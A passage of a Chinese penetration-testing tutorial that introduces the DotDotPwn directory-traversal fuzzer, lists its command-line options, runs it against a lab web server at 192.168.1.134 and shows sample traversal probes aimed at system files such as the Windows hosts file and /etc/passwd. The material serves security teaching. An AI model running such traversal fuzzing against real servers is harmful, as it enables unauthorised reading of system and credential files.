  \n在下一个示例中，`wafw00f` 无法确定使用的确切 WAF，但仍会告知你存在一个 WAF：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_56_0.png)\n\
  \n## 使用 DotDotPwn 进行协议模糊测试\n\nDotDotPwn 是一个精巧的多协议模糊测试工具，用于发现 Web 服务器中的目录遍历漏洞。模糊测试是一种测试技术，用于查找软件应用程序（如\
  \ Web 服务器甚至操作系统）中的糟糕编码或安全漏洞。因此，DotDotPwn 成为一个良好的侦察工具，可用于查找 Web 服务器堆栈中的各种问题，以便日后利用。\n\
  \n现在获取有关环境的尽可能多的信息会使利用阶段变得容易得多。我们会记录我们能找到的一切，然后在适当的时候进行利用。请不要急于进行侦察阶段，因为这只会降低渗透测试的整体质量。我们现在能找到的越多，以后就能利用的越多。\n\
  \n关于 `dotdotpwn` 首先需要知道的是，它支持许多不同的协议或模块。我们将在实验室中专注于 `http` 模块，但还有其他模块可用，例如 `tftp`\
  \ 和 `ftp`。以下是从 CLI 运行 `dotdotpwn` 时可用的开关：\n\n```\nUsage: ./dotdotpwn.pl -m <module>\
  \ -h <host> [OPTIONS]\nAvailable options:\n-m Module [http | http-url | ftp | tftp\
  \ | payload | stdout]\n-h Hostname\n-O Operating System detection for intelligent\
  \ fuzzing (nmap)\n-o Operating System type if known (\"windows\", \"unix\" or \"\
  generic\")\n-s Service version detection (banner grabber)\n-d Depth of traversals\
  \ (e.g. deepness 3 equals to ../../..; default: 6)\n-f Specific filename (e.g. /etc/motd;\
  \ default: according to OS detected, defaults in TraversalEngine.pm)\n-E Add @Extra_files\
  \ in TraversalEngine.pm (e.g. web.config, httpd.conf, etc.)\n-S Use SSL - for HTTP\
  \ and Payload module (use https:// for in url for http-uri)\n-u URL with the part\
  \ to be fuzzed marked as TRAVERSAL (e.g. http://foo:8080/id.php?x=TRAVERSAL&y=31337)\n\
  -k Text pattern to match in the response (http-url & payload modules - e.g. \"root:\"\
  \ if trying /etc/passwd)\n-p Filename with the payload to be sent and the part to\
  \ be fuzzed marked with the TRAVERSAL keyword\n-x Port to connect (default: HTTP=80;\
  \ FTP=21; TFTP=69)\n-t Time in milliseconds between each test (default: 300 (.3\
  \ second))\n-X Use the Bisection Algorithm to detect the exact deepness once a vulnerability\
  \ has been found\n-e File extension appended at the end of each fuzz string (e.g.\
  \ \".php\", \".jpg\", \".inc\")\n-U Username (default: 'anonymous')\n-P Password\
  \ (default: 'dot@dot.pwn')\n-M HTTP Method to use when using the 'http' module [GET\
  \ | POST | HEAD | COPY | MOVE] (default: GET)\n-r Report filename (default: 'HOST_MM-DD-YYYY_HOUR-MIN.txt')\n\
  -b Break after the first vulnerability is found\n-q Quiet mode (doesn't print each\
  \ attempt)\n-C Continue if no data was received from host\n```\n\n现在我们有了所有选项，我们将对其在实验室中的主机\
  \ 192.168.1.134 上进行测试。在我们的测试中，我们将使用 -m 开关使用 http 方法，同时由于时间限制将遍历检测限制为 3。我们还将使用 -h\
  \ 开关指定主机。以下是我们将针对实验室 Web 服务器运行的命令：\n\n```\ndotdotpwn -m http -d 3 -h 192.168.1.134\n\
  ```\n\n由于 dotdotpwn 在进行遍历测试时输出会停止，你可以使用 tcpdump 来验证它正在检查并且正在积极执行某些操作。在此运行期间，当发现某些内容时，你将看到所有目录遍历测试的输出。不过请耐心等待；完成此操作可能需要很长时间：\n\
  \n```\n[*] HTTP Status: 404 | Testing Path: http://192.168.1.134:80/..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts%00\n\
  [*] HTTP Status: 404 | Testing Path: http://192.168.1.134:80/..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts%00index.html\n\
  [*] HTTP Status: 404 | Testing Path: http://192.168.1.134:80/..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts%00index.htm\n\
  [*] HTTP Status: 404 | Testing Path: http://192.168.1.134:80/..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts%00index.htm\n\
  [*] HTTP Status: 404 | Testing Path: http://192.168.1.134:80/..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts%00\n\
